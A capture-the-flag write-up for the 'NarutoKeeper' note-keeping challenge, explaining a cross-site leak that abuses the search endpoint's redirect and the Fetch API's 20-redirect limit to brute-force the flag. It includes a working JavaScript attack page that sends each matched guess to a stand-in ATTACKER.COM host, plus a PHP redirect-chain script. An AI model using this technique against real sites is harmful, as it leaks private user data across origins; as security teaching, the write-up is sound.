# NarutoKeeper

> I was confused and didn't know what's the approproate name for this website :( However just a typical note keeper website \o/ Enjoy the ride :)\
> **Link:** https://20.124.0.135/

{% file src="../../.gitbook/assets/source.tar.gz" %}

In this challenge, we can create notes and search for them.

In particular, the search function is rather interesting. We can see that if a note is found with the given query, then a server-side 302 redirect is issued to `/view`.

```python
@app.route('/search')
def search():
    if 'username' not in session:
        return redirect('/login')
    if 'query' not in request.args:
        return redirect('/home')
    query = str(request.args.get('query'))
    results = get_pastes(session['username'])
    res_content=[{"id":id,"val":get_paste(id)} for id in results]
    if ":" in query:
        toGo=get_paste(query.split(":")[1])
        sear=query.split(":")[0]
    else:
        toGo=res_content[0]["val"]
        sear=query
    i=0
    for paste in res_content:
        i=i+1
        if i>5:
            return redirect("/view?id=MaximumReached&paste="+toGo.strip())     
        if sear in paste["val"]:
            return redirect("/view?id=Found&paste="+toGo.strip())
    return render_template("search.html",error='No results found.',result="")
```

Since the redirect is only issued if the query is part of the note, we can use the redirect as an oracle to detect whether our flag is correct and bruteforce the flag.

Just to be sure, we can also check that the `SameSite` attribute of the cookies is set to `None`, enabling cross-origin requests to carry the victim's cookies.

```python
app.config['SESSION_COOKIE_SAMESITE']="None"
app.config['SESSION_COOKIE_SECURE']= True
```

I read [some slides](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63e29d5a06\_0\_0) on this exact scenario a while back. The attack relies on the fact that the Fetch API has a maximum redirect count of 20. If the redirect count exceeds this value, a network error is returned.

![](https://lh5.googleusercontent.com/Wx6wCcfIg7RBtGr3pV9hasQVoGFm7EsfOAS8Rf-XeLavDHd04SimoI3aTLhJEVAXYFA4jTp3d9fpypge3hgUxYNrYXIGa0BNRveFJsq9wVLauU-FE9MCqY9k--3GOu31GnIZnpauHuI)

Therefore, we can leak whether a redirect occurred in the cross-origin request by catching the network error.

On the client, we will make a request to our own attacker server. This server should redirect to itself 19 times, before redirecting to the actual target URL.

If the target URL then performs a further 302 redirect, then the redirect limit is reached - we can catch the error and exfiltrate the flag so far.

```markup
<html>
    <body>
        <script>
            (async () => {
                const attackerUrl = "http://ATTACKER.COM";
                const checkRedirect = async (numRedirects, toCheck) => {
                    let res = 0;
                    await fetch(`${attackerUrl}/redirect.php?check=${numRedirects}&step=0&url=https://20.124.0.135/search?query=${toCheck}`, {
                        credentials: "include",
                        mode: 'no-cors',
                    }).then((r) => {
                        // no redirect
                    }).catch(async() => {
                        // redirect limit reached
                        // there was an extra redirect (by the server)
                        fetch(`${attackerUrl}/${toCheck}`);
                        res = 1;
                    })
                    return res;
                }
                
                const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-!{}";
                let curr = "Securinets{ArigAt0";

                while (true) {

                    for (let i = 0; i < alphabet.length; i++) {
                        let toCheck = curr + alphabet[i];
                        let res = await checkRedirect(0, toCheck);
                        if (res)
                            break;
                    }
                    
                    curr = toCheck;
                    if (curr[curr.length -1] == '}') {
                        break;
                    }
                }

            })();

        </script>
    </body>
</html>
```

On our server, we run the following PHP script to redirect to ourself 19 times, before redirecting to the target URL.

```php
<?php
    $check = (int) $_GET['check'];
    $step = (int) $_GET['step'];
    $url = $_GET['url'];
    if ($step === 19 - $check) {
        header('Location: ' . $url);
    } else {
        header('Location: redirect.php?check=' . $check . '&step=' . ($step + 1) . '&url=' . $url);
    }
?>
```

Here's the result! Thankfully the admin bot waits long enough for us to slowly bruteforce the flag letter by letter.

![](<../../.gitbook/assets/image (91) (1).png>)
